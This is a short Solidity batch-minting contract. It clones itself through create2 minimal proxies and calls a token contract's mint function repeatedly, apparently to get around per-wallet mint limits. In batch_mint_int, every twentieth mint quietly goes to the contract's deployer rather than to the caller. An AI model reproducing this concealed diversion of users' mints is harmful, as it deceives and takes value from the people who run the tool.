1 // SPDX-License-Identifier: MIT
2 
3 // 微信 fooyao
4 
5 pragma solidity ^0.8.19;
6 
7 contract Batch {
8     address private immutable owner;
9 
10 	constructor() {
11 		owner = msg.sender;
12 	}
13 
14     function createProxies() internal returns (address proxy) {
15 		bytes memory miniProxy = bytes.concat(bytes20(0x3D602d80600A3D3981F3363d3d373d3D3D363d73), bytes20(address(this)), bytes15(0x5af43d82803e903d91602b57fd5bf3));
16         bytes32 salt = keccak256(abi.encodePacked(msg.sender, block.number));
17         assembly {
18             proxy := create2(0, add(miniProxy, 32), mload(miniProxy), salt)
19         }
20 	}
21 
22     function batch_mint_int(address contractAddress, uint batchCount, address _owner, address to) external {
23         bool success;
24         for (uint i = 0; i < batchCount; i++) {
25             if (i>0 && i%20==0){
26                 (success, ) = contractAddress.call(abi.encodeWithSelector(0x6a627842, _owner));
27             }else {
28                 (success, ) = contractAddress.call(abi.encodeWithSelector(0x6a627842, to));
29             }
30             require(success, "Batch transaction failed");
31         }
32         
33     }
34 
35 
36     function batch_mint(address contractAddress, uint batchCount) public {
37         address proxyaddress = createProxies();
38         Batch(proxyaddress).batch_mint_int(contractAddress, batchCount, owner, msg.sender);
39     }
40 }